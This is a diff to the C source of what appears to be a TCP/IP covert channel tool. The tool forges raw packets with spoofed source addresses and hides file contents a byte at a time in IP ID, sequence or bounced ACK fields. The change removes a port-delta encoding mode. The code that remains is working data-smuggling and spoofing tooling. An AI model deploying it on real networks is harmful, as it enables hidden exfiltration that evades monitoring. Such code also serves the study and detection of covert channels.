@@ -26,7 +26,6 @@
 */
 
 #include <stdio.h>
-#include <stdbool.h>
 #include <stdlib.h>
 #include <signal.h>
 #include <string.h>
@@ -43,7 +42,7 @@
 
 /* Prototypes */
 void forgepacket(unsigned int, unsigned int, unsigned short, unsigned 
-                 short,char *,int,int,int,int,int,bool,bool); 
+                 short,char *,int,int,int,int); 
 unsigned short in_cksum(unsigned short *, int);
 unsigned int host_convert(char *);
 void usage(char *);
@@ -51,8 +50,8 @@ void usage(char *);
 main(int argc, char **argv)
 {
    unsigned int source_host=0,dest_host=0;
-   unsigned short source_port=0,dest_port=0;
-   int ipid=0,seq=0,port=0,ack=0,server=0,file=0;
+   unsigned short source_port=0,dest_port=80;
+   int ipid=0,seq=0,ack=0,server=0,file=0;
    int count;
    char desthost[80],srchost[80],filename[80];
 
@@ -100,8 +99,6 @@ main(int argc, char **argv)
       ipid=1;
     else if (strcmp(argv[count],"-seq") == 0)
       seq=1;
-    else if (strcmp(argv[count],"-port") == 0)
-      port=1;
     else if (strcmp(argv[count],"-ack") == 0)
       ack=1;
     else if (strcmp(argv[count],"-server") == 0)
@@ -109,22 +106,13 @@ main(int argc, char **argv)
     }
 
    /* check the encoding flags */
-   if(ipid+seq+port+ack == 0)
+   if(ipid+seq+ack == 0)
     ipid=1; /* set default encode type if none given */
-   else if (ipid+seq+port+ack !=1)
+   else if (ipid+seq+ack !=1)
     {
-    printf("\n\nOnly one encoding/decode flag (-ipid -seq -port -ack) can be used at a time.\n\n");
+    printf("\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
     exit(1);
     }
-
-   if(port && source_port && dest_port) {
-      printf("\n\n You can only supply at most 1 of source and dest port for port encoding type\n\n");
-      exit(1);
-   }
-
-   bool supplied_source_port = source_port;
-   bool supplied_dest_port = dest_port;
-
    /* Did they give us a filename? */
    if(file != 1)
     {
@@ -158,8 +146,6 @@ main(int argc, char **argv)
         printf("Encoding Type   : IP ID\n");
        else if(seq == 1)
         printf("Encoding Type   : IP Sequence Number\n");
-       else if (port == 1)
-        printf("Encoding Type   : IP Source/Dest Port Delta");
        printf("\nClient Mode: Sending data.\n\n");
       }
      }
@@ -184,20 +170,20 @@ main(int argc, char **argv)
       printf("Decoding Type Is: IP packet ID\n");
      else if(seq == 1)
       printf("Decoding Type Is: IP Sequence Number\n");
-     else if(port == 1)
-      printf("Decoding Type Is: IP Source/Dest Port Delta");
      else if(ack == 1)
       printf("Decoding Type Is: IP ACK field bounced packet.\n");
      printf("\nServer Mode: Listening for data.\n\n");
      }
 
      /* Do the dirty work */
-     forgepacket(source_host, dest_host, source_port, dest_port,filename,server,ipid,seq,port,ack, supplied_source_port, supplied_dest_port);
+     forgepacket(source_host, dest_host, source_port, dest_port
+                ,filename,server,ipid,seq,ack);
 exit(0);
 }
 
 void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned 
-short source_port, unsigned short dest_port, char *filename, int server, int ipid, int seq, int port, int ack, bool supplied_source_port, bool supplied_dest_port) 
+short source_port, unsigned short dest_port, char *filename, int server, int ipid
+, int seq, int ack) 
 {
    struct send_tcp
    {
@@ -281,47 +267,18 @@ else /* otherwise we "encode" it with our cheesy algorithm */
    send_tcp.ip.daddr = dest_addr;
 
 /* begin forged TCP header */
-if(source_port == 0) {
-/* if the didn't supply a source port, we make one */
-   source_port = (rand() % (15283)) + 49152;
-} /* otherwise use the one given */
-if(dest_port == 0) {
-/* if the didn't supply a dest port, default to use 80 */
-   dest_port = 80;
-} /* otherwise use the one given */
-
-   // Set seq if seq == 1
-   send_tcp.tcp.seq = seq==1 ? ch : 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
-
-   if(port==1) { // if we are using port method
-      int port_max = 65535;
-      int ch_ascii = (int)ch;
-
-      int ports_delta = supplied_dest_port - supplied_source_port;
-
-      // If the randomized source/dest ports don't match the character value (which is most likely the case)
-      if (abs(ports_delta) != ch_ascii) {
-         if (supplied_dest_port) {
-            if (ch_ascii + dest_port > port_max) {
-               source_port = dest_port - ch_ascii;
-            } else {
-               source_port = ch_ascii + dest_port;
-            }
-            printf("Calculated source port: %d\n", source_port);
-         } else {
-            if (ch_ascii + source_port > port_max) {
-               dest_port = source_port - ch_ascii;
-            } else {
-               dest_port = ch_ascii + source_port;
-            }
-            printf("Calculated dest port: %d\n", dest_port);
-         } 
-      }
-   }
-         
-   /* forge source/destination port */
-   send_tcp.tcp.dest = htons(dest_port);
+if(source_port == 0) /* if the didn't supply a source port, we make one */
+   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+else /* otherwise use the one given */
    send_tcp.tcp.source = htons(source_port);
+
+if(seq==0) /* if we are not encoding the value into the seq number */
+   send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+else /* otherwise we'll hide the data using our cheesy algorithm one more time. */
+   send_tcp.tcp.seq = ch;
+
+   /* forge destination port */
+   send_tcp.tcp.dest = htons(dest_port);
   
    /* the rest of the flags */
    /* NOTE: Other covert channels can use the following flags to encode data a BIT */
@@ -425,13 +382,6 @@ else
 			fprintf(output,"%c",recv_pkt.tcp.seq); 
    			fflush(output);
 			}
-         else if (port==1)
-         {
-            int delta = abs(recv_pkt.tcp.dest - recv_pkt.tcp.source);
-            printf("Receiving Data: %c\n",ntohs(delta));
-			   fprintf(output,"%c",delta); 
-   			fflush(output);
-         }
         /* Use a bounced packet from a remote server to decode the data */
         /* This technique requires that the client initiates a SEND to */
         /* a remote host with a SPOOFED source IP that is the location */
@@ -480,21 +430,14 @@ else
 			else if (seq==1)
 			{
         		printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
-			   fprintf(output,"%c",recv_pkt.tcp.seq); 
+			fprintf(output,"%c",recv_pkt.tcp.seq); 
    			fflush(output);
 			}
-         else if (port==1)
-         {
-            int delta = abs(recv_pkt.tcp.dest - recv_pkt.tcp.source);
-            printf("Receiving Data: %c\n",ntohs(delta));
-			   fprintf(output,"%c",delta); 
-   			fflush(output);
-         }
 			/* Do the bounce decode again... */
 			else if (ack==1)
 			{
         		printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
-			   fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
+			fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
    			fflush(output);
 			}
 	 	} /* end if loop to check for source port decoding */
@@ -602,7 +545,6 @@ void usage(char *progname)
       printf("[Encode Type] - Optional encoding type\n");
       printf("-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
       printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
-      printf("-port - Encode data with ASCII code in source ports.\n");
       printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
       printf("        This ONLY works from server mode and is made to decode\n");
       printf("        covert channel packets that have been bounced off a remote\n");
